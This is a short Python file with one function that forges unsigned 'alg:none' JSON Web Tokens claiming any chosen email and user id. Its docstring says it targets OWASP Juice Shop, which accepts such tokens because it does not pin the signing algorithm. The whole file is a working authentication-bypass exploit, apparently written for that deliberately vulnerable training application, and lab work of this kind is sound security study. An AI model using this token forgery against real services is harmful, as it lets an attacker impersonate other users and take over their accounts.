import base64
import json
import time


def _b64url(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("ascii")


def _segment(obj: dict) -> str:
    return _b64url(json.dumps(obj, separators=(",", ":")).encode("utf-8"))


def forge_unsigned_jwt(email: str, user_id: int = 1) -> str:
    """
    Forge an unsigned (alg:none) JWT that claims to be `email`.

    Juice Shop verifies tokens without pinning the algorithm, so a token whose
    header declares `alg: none` and whose `data.email` names another user is
    accepted. The signature segment is left empty.

    Args:
        email (str): The identity the forged token claims.
        user_id (int): The user id placed in the claim.

    Returns:
        str: The `header.payload.` token, with an empty signature segment.
    """
    header = {"alg": "none", "typ": "JWT"}
    now = int(time.time())
    payload = {
        "status": "success",
        "data": {"id": user_id, "email": email},
        "iat": now,
        "exp": now + 3600,
    }
    return f"{_segment(header)}.{_segment(payload)}."
